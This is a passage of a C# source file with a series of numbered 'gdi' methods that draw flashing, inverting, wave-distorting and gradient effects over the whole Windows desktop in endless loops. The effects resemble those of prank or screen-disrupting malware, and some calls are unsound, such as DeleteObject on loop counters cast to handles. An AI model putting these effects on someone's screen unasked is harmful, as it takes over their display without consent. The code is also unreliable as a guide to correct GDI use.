                        } while (local_14 != 0);
                        Thread.Sleep( 1 );
                        goto LAB_00403140;
                    }
                }
                else if (uVar4 != 0xfffffe0c)
                {
                    iVar6 = uVar5 - x1;
                    local_14 = (int)((uVar4 + 499) / 0x1e + 1);
                    uVar4 = (uint)x1;
                    do
                    {
                        pHVar3 = CreateRectRgn( x1, x1 + iVar6, (int)uVar4, (int)(uVar4 + iVar6) );
                        SelectClipRgn( hdc, pHVar3 );
                        BitBlt( hdc, 0, 0, cx, cy, hdc, 0, 0, 0x330008 );
                        Thread.Sleep( 1 );
                        uVar4 = uVar4 + 0x1e;
                        x1 = x1 - 0x1e;
                        local_14 = local_14 + -1;
                    } while (local_14 != 0);
                }
                Thread.Sleep( 1 );
                if (gdi16_4_cancel == 1)
                {
                    gdi16_4_cancel = 0;
                    return;
                }
            } while (true);
        }
        public static void gdi17()
        {
            while (true)
            {
                Thread.Sleep( 50 );
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;
                int x1 = r.Next() % (w - r.Next( 800 ));
                int y1 = r.Next() % (h - r.Next( 800 ));
                int x2 = r.Next() % (w - r.Next( 800 ));
                int y2 = r.Next() % (h - r.Next( 800 ));
                int width = r.Next() % 500;
                int height = r.Next() % 500;

                BitBlt( hdc, x1, y1, width, height, hdc, x2, y2, TernaryRasterOperations.Solaris2 );
                if (gdi17_cancel == 1)
                {
                    gdi17_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi18()
        {
            int t = 0;
            while (true)
            {
                Thread.Sleep( 10 );
                IntPtr rgb = CreateSolidBrush( (uint)t + 100 );
                SelectObject( hdc, rgb );
                BitBlt( hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT );
                DeleteObject( rgb );

                if (gdi18_cancel == 1)
                {
                    gdi18_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi19()
        {
            while (true)
            {
                Random rand = new Random();
                IntPtr rgn = CreateEllipticRgn( rand.Next( x ), rand.Next( y ), rand.Next( x ), rand.Next( y ) );
                SelectClipRgn( hdc, rgn );
                SelectObject( hdc, CreateSolidBrush( (uint)ColorTranslator.ToWin32( Color.FromArgb( rand.Next() % 255, rand.Next() % 255, rand.Next() % 255 ) ) ) );
                BitBlt( hdc, rand.Next( x ), rand.Next( y ), x, y, hdc, rand.Next( x ), rand.Next( y ), TernaryRasterOperations.PATINVERT );
                if (gdi19_cancel == 1)
                {
                    gdi19_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi20()
        {
            while (true)
            {
                Random rand = new Random();
                IntPtr rgn = CreateEllipticRgn( rand.Next( x ), rand.Next( y ), 1000, 1000 );
                SelectClipRgn( hdc, rgn );
                SelectObject( hdc, CreateSolidBrush( (uint)ColorTranslator.ToWin32( Color.FromArgb( rand.Next() % 255, rand.Next() % 255, rand.Next() % 255 ) ) ) );
                BitBlt( hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT );
                if (gdi20_cancel == 1)
                {
                    gdi20_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi21()
        {
            while (true)
            {
                Random rand = new Random();
                IntPtr rgn = CreateEllipticRgn( 10, 10, 1000, 1000 );
                SelectClipRgn( hdc, rgn );
                SelectObject( hdc, CreateSolidBrush( (uint)ColorTranslator.ToWin32( Color.FromArgb( rand.Next() % 100, rand.Next() % 100, rand.Next() % 100 ) ) ) );
                BitBlt( hdc, rand.Next( x ), rand.Next( y ), x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT );
                if (gdi21_cancel == 1)
                {
                    gdi21_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi22()
        {
            int a = 0;
            int i = 0;

            for (int t = 0 ; i < (a + 20) ; t++)
            {

                int w = GetSystemMetrics( 0 ), h = GetSystemMetrics( 1 );
                // Rectangle rect = new Rectangle(0, 0, w, h);
                IntPtr hcdc = CreateCompatibleDC( hdc );
                IntPtr hBitmap = CreateCompatibleBitmap( hdc, w, h );
                SelectObject( hcdc, hBitmap );
                BitBlt( hcdc, 0, 0, w, h, hdc, 0, 0, TernaryRasterOperations.SRCCOPY );

                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = 20;
                blf.AlphaFormat = 0;

                AlphaBlend( hdc, System.Windows.Forms.Screen.PrimaryScreen.Bounds.X - t % 5, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Y - t % 5, w, h, hcdc, System.Windows.Forms.Screen.PrimaryScreen.Bounds.X, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Y, w, h, blf );
                AlphaBlend( hdc, System.Windows.Forms.Screen.PrimaryScreen.Bounds.X + t % 5, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Y + t % 5, w, h, hcdc, System.Windows.Forms.Screen.PrimaryScreen.Bounds.X, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Y, w, h, blf );
                AlphaBlend( hdc, System.Windows.Forms.Screen.PrimaryScreen.Bounds.X - t % 5, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Y - t % 5, w, h, hcdc, System.Windows.Forms.Screen.PrimaryScreen.Bounds.X, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Y, w, h, blf );
                AlphaBlend( hdc, System.Windows.Forms.Screen.PrimaryScreen.Bounds.X + t % 5, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Y + t % 5, w, h, hcdc, System.Windows.Forms.Screen.PrimaryScreen.Bounds.X, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Y, w, h, blf );

                DeleteObject( hcdc );
                DeleteObject( hBitmap );

                Sleep( 50 );

                if (gdi22_cancel == 1)
                {
                    gdi22_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi23()
        {
            for ( ; ; )
            {
                int w = GetSystemMetrics( 0 );
                int h = GetSystemMetrics( 1 );

                IntPtr hdc = GetDC( IntPtr.Zero );
                IntPtr hdc2 = GetDC( IntPtr.Zero );

                StretchBlt( hdc, 0, 0, w + 300, h + 300, hdc, rand() % w, rand() % h, w, h, TernaryRasterOperations.SRCCOPY );

                IntPtr rgb = CreateSolidBrush( (uint)0x01245 );

                SelectObject( hdc2, rgb );

                BitBlt( hdc2, 0, 0, w, h, hdc2, w, h, TernaryRasterOperations.PATINVERT );

                Sleep( 100 );

                if (gdi23_cancel == 1)
                {
                    gdi23_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi24()
        {
            IntPtr desk = GetDC( IntPtr.Zero ); IntPtr wnd = GetDesktopWindow();
            int w = GetSystemMetrics( 0 ), h = GetSystemMetrics( 1 );

            float angle = 1;
            while (true)
            {
                desk = GetDC( IntPtr.Zero );
                for (float i = 0 ; i < w + h ; i += 0.99f)
                {
                    int a = (int)(Sin2( angle ) * 20);
                    BitBlt( desk, 0, (int)i, w, 90, desk, a, (int)i, TernaryRasterOperations.SRCCOPY );
                    angle += PI / 140;
                    DeleteObject( (IntPtr)i ); DeleteObject( (IntPtr)a );
                }
                ReleaseDC( wnd, desk );
                DeleteDC( desk ); DeleteObject( (IntPtr)w ); DeleteObject( (IntPtr)h ); DeleteObject( (IntPtr)angle );

                if (gdi24_cancel == 1)
                {
                    gdi24_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi25()
        {
            IntPtr desk = GetDC( IntPtr.Zero );
            IntPtr wnd = GetDesktopWindow();
            int w = GetSystemMetrics( 0 ), h = GetSystemMetrics( 1 );

            float angle = 1;
            while (true)
            {
                desk = GetDC( IntPtr.Zero );
                for (float i = 0 ; i < w + h ; i += 0.99f)
                {
                    int a = (int)(Sin2( angle ) * 10);
                    BitBlt( desk, (int)i, 0, 20, h, desk, (int)i, a, TernaryRasterOperations.SRCCOPY );
                    angle += PI / 100;
                    DeleteObject( (IntPtr)i ); DeleteObject( (IntPtr)a );
                }
                ReleaseDC( wnd, desk );
                DeleteDC( desk );
                DeleteObject( (IntPtr)w );
                DeleteObject( (IntPtr)h );
                DeleteObject( (IntPtr)angle );

                if (gdi25_cancel == 1)
                {
                    gdi25_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi26()
        {
            for ( ; ; )
            {
                Graphics hdc = Graphics.FromHdc( GetDC( IntPtr.Zero ) );

                Pen Pen = new Pen( Color.FromArgb( 255, rand() % 255, rand() % 255, rand() % 255 ), 1 );
                hdc.DrawLine( Pen, rand() % x, rand() % y, rand() % x, rand() % y );

                HatchBrush hb = new HatchBrush( (HatchStyle)(rand() % 50), Color.FromArgb( rand() % 255, rand() % 255, rand() % 255, rand() % 255 ), Color.FromArgb( 255, rand() % 255, rand() % 255, rand() % 255 ) );
                // hdc.DrawString(hatchStyle.ToString(), this.Font, new SolidBrush(Color.Black), x + 10, y);
                hdc.FillEllipse( hb, rand() % x, rand() % y, rand() % 255, rand() % 255 );

                if (gdi26_cancel == 1)
                {
                    gdi26_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi27()
        {
            for ( ; ; )
            {
                Rectangle rect = new Rectangle( 0, 0, x, y );

                Bitmap bmp = new Bitmap( CaptureScreen() );

                Graphics g = Graphics.FromImage( bmp );
                g.SmoothingMode = SmoothingMode.HighSpeed;
                g.PixelOffsetMode = PixelOffsetMode.HighSpeed;

                LinearGradientBrush linearGradient = new LinearGradientBrush( rect, Color.FromArgb( rand() % 50, rand() % 255, rand() % 255, rand() % 255 ), Color.FromArgb( rand() % 50, rand() % 255, rand() % 255, rand() % 255 ), (LinearGradientMode)(rand() % 3) );

                g.FillRectangle( linearGradient, rect );

                bmp.Save( TempPath + "b.bmp" );

                g.Dispose();
                linearGradient.Dispose();
                bmp.Dispose();

                Bitmap bmp2 = new Bitmap( TempPath + "b.bmp" );

                Graphics hdc2 = Graphics.FromHdc( GetDC( IntPtr.Zero ) );
                hdc2.SmoothingMode = SmoothingMode.HighSpeed;
                hdc2.PixelOffsetMode = PixelOffsetMode.HighSpeed;

                IntPtr hdcDst = hdc2.GetHdc();
                IntPtr hdcTemp = CreateCompatibleDC( hdcDst );
                SelectObject( hdcTemp, bmp2.GetHbitmap() );
                BitBlt( hdcDst, 0, 0, bmp2.Width, bmp2.Height, hdcTemp, 0, 0, TernaryRasterOperations.SRCCOPY );

                hdc2.Dispose();
                bmp2.Dispose();

                File.Delete( TempPath + "b.bmp" );

                DeleteDC( hdcDst );
                DeleteDC( hdcTemp );
                ReleaseDC( hwnd, hdcDst );
                ReleaseDC( hwnd, hdcDst );

                if (gdi27_cancel == 1)
                {
                    gdi27_cancel = 0;
                    return;
                }
            }
        }
    }
}